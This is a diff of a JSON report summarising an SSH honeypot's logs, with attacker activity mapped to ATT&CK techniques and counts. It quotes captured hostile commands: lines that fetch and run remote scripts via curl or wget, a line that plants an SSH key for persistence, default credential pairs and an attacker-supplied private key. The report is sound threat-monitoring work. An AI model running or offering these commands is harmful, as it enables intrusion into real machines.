@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-14 12:02:38",
+  "generated": "2026-09-14 13:03:45",
   "totals": {
-    "commands": 937,
-    "login_failed": 2828,
-    "login_success": 294,
-    "sessions": 3150
+    "commands": 966,
+    "login_failed": 3049,
+    "login_success": 302,
+    "sessions": 3384
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2828,
+      "count": 3049,
       "examples": [
         "root / ASDF321#@!",
         "root / admin",
@@ -21,14 +21,14 @@
         "ubnt / ubnt"
       ],
       "first": "2026-09-14T00:02:07.251693Z",
-      "last": "2026-09-14T11:59:19.553011Z",
-      "unique_ips": 46
+      "last": "2026-09-14T13:03:42.400460Z",
+      "unique_ips": 52
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 294,
+      "count": 302,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / xirtam",
@@ -37,8 +37,8 @@
         "ubnt / ubnt"
       ],
       "first": "2026-09-14T00:05:42.284899Z",
-      "last": "2026-09-14T11:55:41.496207Z",
-      "unique_ips": 37
+      "last": "2026-09-14T12:54:07.855102Z",
+      "unique_ips": 42
     },
     {
       "id": "T1083",
@@ -59,7 +59,7 @@
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 32,
+      "count": 33,
       "examples": [
         "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ",
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
@@ -68,14 +68,14 @@
         ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/"
       ],
       "first": "2026-09-14T00:24:15.725892Z",
-      "last": "2026-09-14T10:30:47.978038Z",
-      "unique_ips": 6
+      "last": "2026-09-14T12:15:18.459173Z",
+      "unique_ips": 7
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 22,
+      "count": 23,
       "examples": [
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh",
         "https://del.sou.pp.ua/install.sh",
@@ -84,14 +84,14 @@
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-09-14T00:24:16.661619Z",
-      "last": "2026-09-14T08:02:21.258032Z",
-      "unique_ips": 5
+      "last": "2026-09-14T12:15:18.459173Z",
+      "unique_ips": 6
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 14,
+      "count": 15,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "uname -a",
@@ -100,22 +100,22 @@
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-09-14T00:24:20.002540Z",
-      "last": "2026-09-14T10:30:47.978038Z",
-      "unique_ips": 11
+      "last": "2026-09-14T12:22:02.977408Z",
+      "unique_ips": 12
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 4,
+      "count": 5,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "id",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-09-14T03:38:32.913918Z",
-      "last": "2026-09-14T10:30:47.978038Z",
-      "unique_ips": 4
+      "last": "2026-09-14T12:15:17.983908Z",
+      "unique_ips": 5
     },
     {
       "id": "T1057",
@@ -146,6 +146,19 @@
       "unique_ips": 3
     },
     {
+      "id": "T1087.001",
+      "name": "Account Discovery: Local Account",
+      "tactic": "Discovery",
+      "count": 3,
+      "examples": [
+        "cat /etc/passwd",
+        "printf 'COWRIE_DIR:%s\\n' \"$(ls -d /home/cowrie /opt/cowrie /srv/cowrie 2>/dev/null | head -1)\";printf 'PROC1_CMD:%s\\n' \""
+      ],
+      "first": "2026-09-14T05:40:09.567868Z",
+      "last": "2026-09-14T12:15:17.988974Z",
+      "unique_ips": 3
+    },
+    {
       "id": "T1070.004",
       "name": "Indicator Removal: File Deletion",
       "tactic": "Defense Evasion",
@@ -155,19 +168,6 @@
       ],
       "first": "2026-09-14T06:47:25.203386Z",
       "last": "2026-09-14T10:30:47.978038Z",
-      "unique_ips": 2
-    },
-    {
-      "id": "T1087.001",
-      "name": "Account Discovery: Local Account",
-      "tactic": "Discovery",
-      "count": 2,
-      "examples": [
-        "cat /etc/passwd",
-        "printf 'COWRIE_DIR:%s\\n' \"$(ls -d /home/cowrie /opt/cowrie /srv/cowrie 2>/dev/null | head -1)\";printf 'PROC1_CMD:%s\\n' \""
-      ],
-      "first": "2026-09-14T05:40:09.567868Z",
-      "last": "2026-09-14T08:02:16.156380Z",
       "unique_ips": 2
     },
     {
@@ -234,19 +234,19 @@
   "unmapped": [
     [
       "system",
-      261
+      265
     ],
     [
       "sh",
-      261
+      265
     ],
     [
       "shell",
-      73
+      77
     ],
     [
       "/bin/busybox UNSTABLE",
-      71
+      74
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -254,6 +254,42 @@
     ],
     [
       "enable",
+      3
+    ],
+    [
+      "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
+      2
+    ],
+    [
+      "bash",
+      2
+    ],
+    [
+      "cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----",
+      2
+    ],
+    [
+      "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW",
+      2
+    ],
+    [
+      "QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ",
+      2
+    ],
+    [
+      "0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg",
+      2
+    ],
+    [
+      "AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9",
+      2
+    ],
+    [
+      "Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=",
+      2
+    ],
+    [
+      "-----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no",
       2
     ],
     [
@@ -274,42 +310,6 @@
     ],
     [
       "enablelinuxshell",
-      1
-    ],
-    [
-      "ping ;sh",
-      1
-    ],
-    [
-      "cd /proc && cat self/cmdline",
-      1
-    ],
-    [
-      "/ip cloud print",
-      1
-    ],
-    [
-      "locate D877F783D5D3EF8Cs",
-      1
-    ],
-    [
-      "echo Hi | cat -n",
-      1
-    ],
-    [
-      "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
-      1
-    ],
-    [
-      "bash",
-      1
-    ],
-    [
-      "cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----",
-      1
-    ],
-    [
-      "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW",
       1
     ]
   ]
